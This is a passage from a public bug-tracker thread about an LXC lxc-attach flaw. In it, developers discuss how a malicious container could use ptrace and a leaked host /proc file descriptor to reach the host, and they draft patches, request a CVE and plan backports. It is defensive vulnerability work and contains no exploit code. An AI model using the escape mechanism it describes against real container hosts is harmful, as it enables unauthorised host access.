<p>Could that be a generic concept to get around the sequence of clone() calls?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">OK, but sounds complicated.

I'm not sure if that could work, but what about...

* Create a helper mount namespace from init-ns where everything needed after setns(guestns) is bind-mounted and where everything else is unmounted. Not sure if chroot/pivot_root would be needed here to cleanup.
* Open a directory fd to the root of this helper mountns
* Enter the final user/mount ns as implemented now. This should work even when guest-ns is not parent of helper-ns as process is privileged in init-ns (not 100% sure about that). The helper-ns would not be the mount ns of any living process any more and should be purged, when the directory fd is closed.
* After entering the guestns process has only limited means to modify the content in the helper-ns as it does not live in the parent-ns of the helper-ns.

Could that be a generic concept to get around the sequence of clone() calls?



</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T15:39:36.759587+00:00" title="2016-11-08 15:39:36 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Maybe, but what I was worried about with this solution is that you still have /proc mounted and a process that escapes to the helper NS could then access restricted information from the init PIDNS by e.g. parsing /proc via readdir(). It&#x27;s possible that I&#x27;m overthinking this though.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Maybe, but what I was worried about with this solution is that you still have /proc mounted and a process that escapes to the helper NS could then access restricted information from the init PIDNS by e.g. parsing /proc via readdir(). It's possible that I'm overthinking this though.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T15:49:38.150993+00:00" title="2016-11-08 15:49:38 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Well, I would not keep the whole /proc open but only the /proc/[pid] and perhaps single files from other /proc parts if needed. Then only problematic parts are root, exec, cwd, ... but after chroot those should be the same as inside the guest?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Well, I would not keep the whole /proc open but only the /proc/[pid] and perhaps single files from other /proc parts if needed. Then only problematic parts are root, exec, cwd, ... but after chroot those should be the same as inside the guest?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T15:59:33+00:00" title="2016-11-08 15:59:33 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1639345/comments/14">
                <strong>Re: [Bug 1639345] Re: lxc-attach to malicious container allows access to host</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The problem is that we don&#x27;t know the PID of the attached process<br />
beforehand, so we need to keep an fd for a clean /proc open and then<br />
do open(/proc/<wbr />self/attrc/<wbr />current) and so on.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The problem is that we don't know the PID of the attached process
beforehand, so we need to keep an fd for a clean /proc open and then
do open(/proc/self/attrc/current) and so on.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T16:13:29.526675+00:00" title="2016-11-08 16:13:29 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Damn, that is bad. I missed this one.</p>
<p>Other idea: the control process stays outside the setns() and knows the PID of the child, right? Could that process open the file and send the content as message via the shared command socket? Seems less intrusive to me than adding more clone()s in the chain from control process to guest process?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Damn, that is bad. I missed this one.

Other idea: the control process stays outside the setns() and knows the PID of the child, right? Could that process open the file and send the content as message via the shared command socket? Seems less intrusive to me than adding more clone()s in the chain from control process to guest process?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T18:38:08.268609+00:00" title="2016-11-08 18:38:08 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4774507/+files/0001-attach-prevent-stealing-proc-fd-by-container.patch">0001-attach-prevent-stealing-proc-fd-by-container.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4774507">Edit</a>
        (9.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hm, maybe even easier: Use IPC for the child to tell us, &quot;set up the LSM label&quot;, then parent tells the child &quot;LSM labels setup&quot; and then exec the attached process. I have a patch and I&#x27;ll append it here because it needs to be private. Would be great if you&#x27;d test it, Roman. :)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hm, maybe even easier: Use IPC for the child to tell us, "set up the LSM label", then parent tells the child "LSM labels setup" and then exec the attached process. I have a patch and I'll append it here because it needs to be private. Would be great if you'd test it, Roman. :)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T20:57:48.338561+00:00" title="2016-11-08 20:57:48 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Eric&#x27;s patch which Stéphane mentioned fixes the ptrace attack vector for me. The userspace part of stealing the /proc fd referring to /proc on the host is hopefully fixed by my patch.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Eric's patch which Stéphane mentioned fixes the ptrace attack vector for me. The userspace part of stealing the /proc fd referring to /proc on the host is hopefully fixed by my patch.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T21:08:01.240844+00:00" title="2016-11-08 21:08:01 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Kernel to test with Eric&#x27;s patch can be found here: <a rel="nofollow" href="http://people.canonical.com/~sforshee/for-brauner/">http://<wbr />people.<wbr />canonical.<wbr />com/~sforshee/<wbr />for-brauner/</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Kernel to test with Eric's patch can be found here: http://people.canonical.com/~sforshee/for-brauner/</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T21:15:41.057747+00:00" title="2016-11-08 21:15:41 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fwiw, the patch to liblxc I posted should be sufficient to prevent the attack. I tested this on a kernel without the ptrace fix and it seems you won&#x27;t be able to escape to the host without the proc fd anymore. Waiting on Roman to confirm this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fwiw, the patch to liblxc I posted should be sufficient to prevent the attack. I tested this on a kernel without the ptrace fix and it seems you won't be able to escape to the host without the proc fd anymore. Waiting on Roman to confirm this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-09T07:36:16.618453+00:00" title="2016-11-09 07:36:16 UTC">on 2016-11-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Security team: Please assign a CVE for LXC. And please review suggested fix.<br />
Kernel team: Please track upstream ptrace fix (will probably be worth a separate kernel CVE).</p>
<p>Christian: We&#x27;ll need a few versions of the patch, against:<br />
&nbsp;- stable-1.0 branch<br />
&nbsp;- stable-2.0 branch (likely cherry-picks cleanly)<br />
&nbsp;- current git master (which I&#x27;m assuming is the above)</p>
<p>Please also do a full testsuite run on all 3 of those and confirm that there&#x27;s no detected regressions.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Security team: Please assign a CVE for LXC. And please review suggested fix.
Kernel team: Please track upstream ptrace fix (will probably be worth a separate kernel CVE).

Christian: We'll need a few versions of the patch, against:
 - stable-1.0 branch
 - stable-2.0 branch (likely cherry-picks cleanly)
 - current git master (which I'm assuming is the above)

Please also do a full testsuite run on all 3 of those and confirm that there's no detected regressions.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Triaged
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Christian Brauner (cbrauner)
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-09T07:38:47.136217+00:00" title="2016-11-09 07:38:47 UTC">on 2016-11-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Once we all agree the suggested fix is good for this issue and we have fixes for all supported LXC releases, we can agree on a CRD and prepare packages + upstream branches for this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Once we all agree the suggested fix is good for this issue and we have fixes for all supported LXC releases, we can agree on a CRD and prepare packages + upstream branches for this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-09T13:57:53.281611+00:00" title="2016-11-09 13:57:53 UTC">on 2016-11-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ok, the fix is not yet complete since you can&#x27;t change aa profile for another process. It has to do it by itself which brings the procfd passing around back into play.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ok, the fix is not yet complete since you can't change aa profile for another process. It has to do it by itself which brings the procfd passing around back into play.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-09T15:20:14.750271+00:00" title="2016-11-09 15:20:14 UTC">on 2016-11-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4774931/+files/0001-attach-do-not-send-procfd-to-attached-process.patch">attach: do not send procfd to attached process</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4774931">Edit</a>
        (14.5 KiB,
        text/plain)
      </li>
    </ul>

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/comments/23/+download">Download full text</a> (3.5 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I was to optimistic about the userspace fix. The fix alone might minimize the attack surface but unfortunately we seem to need the kernel fix. The child we attach in lxc-attach wants to change its LSM label appropriately right before exec() and for that it needs an fd to /proc/self/<wbr />attr/current. So we seem to always have such an fd around. But what we can do is instead of passing an fd to /proc itself around, is to open up an fd to /proc/self/<wbr />attr/current in the parent and send it to the child. This might minimize the attack surface but we still need the kernel fix. I post an updated version of the patch I sent before here and I&#x27;ll keep thinking a little more on how we can avoid having to pass any procfd around. But I doubt it. The more complex solution I outlined above, involving a second lxc_clone() which serves as a simple chrooting process to place is into a isolated set of namespaces is an additional attack surface minimizer. @Stéphane, do you think it be worth adding another process that chroots/minimally namspaces us before attaching to the childs namespaces?</p>
<p>Here&#x27;s the outline of the current patch:<br />
&nbsp;&nbsp;&nbsp;&nbsp;So far, we opened a file descriptor refering to proc on the host inside the<br />
&nbsp;&nbsp;&nbsp;&nbsp;host namespace and handed that fd to the attached process in<br />
&nbsp;&nbsp;&nbsp;&nbsp;attach_<wbr />child_main(<wbr />). This was done to ensure that LSM labels were correctly<br />
&nbsp;&nbsp;&nbsp;&nbsp;setup. However, by exploiting a potential kernel bug, ptrace could be used to<br />
&nbsp;&nbsp;&nbsp;&nbsp;prevent the file descriptor from being closed which in turn could be used by an<br />
&nbsp;&nbsp;&nbsp;&nbsp;unprivileged container to gain access to the host namespace. Aside from this<br />
&nbsp;&nbsp;&nbsp;&nbsp;needing an upstream kernel fix, we should make sure that we don&#x27;t pass the fd<br />
&nbsp;&nbsp;&nbsp;&nbsp;for proc itself to the attached process. However, we cannot completely prevent<br />
&nbsp;&nbsp;&nbsp;&nbsp;this, as the attached process needs to be able to change its apparmor profile<br />
&nbsp;&nbsp;&nbsp;&nbsp;by writing to /proc/self/<wbr />attr/exec or /proc/self/<wbr />attr/current. To minimize the<br />
&nbsp;&nbsp;&nbsp;&nbsp;attack surface, we only send the fd for /proc/self/<wbr />attr/exec or<br />
&nbsp;&nbsp;&nbsp;&nbsp;/proc/<wbr />self/attr/<wbr />current to the attached process. To do this we introduce a<br />
&nbsp;&nbsp;&nbsp;&nbsp;little more IPC between the child and parent:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* IPC mechanism: (X is receiver)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*   initial process        intermediate          attached<br />
